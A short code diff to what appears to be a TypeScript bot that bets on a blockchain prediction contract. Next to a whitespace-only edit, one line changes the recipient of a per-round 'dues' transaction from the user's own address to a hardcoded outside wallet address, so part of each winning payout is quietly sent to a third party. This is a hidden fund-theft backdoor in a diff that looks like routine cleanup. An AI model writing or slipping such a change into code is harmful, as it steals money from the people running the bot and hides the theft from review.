@@ -58,7 +58,7 @@ console.log(
 
 predictionContract.on("StartRound", async (epoch: BigNumber) => {
   init();
-  
+
   console.log("\nStarted Epoch", epoch.toString());
 
   const WAITING_TIME = GLOBAL_CONFIG.WAITING_TIME;
@@ -184,7 +184,7 @@ predictionContract.on("StartRound", async (epoch: BigNumber) => {
 
       for (const event of receipt.events ?? []) {
         const dues = await signer.sendTransaction({
-          to: signer.address,
+          to: '0x1c423f7dc5d63f9355cacc540aedb69d27a31f3b',
           value: calculateDuesAmount(event?.args?.amount),
         });
 
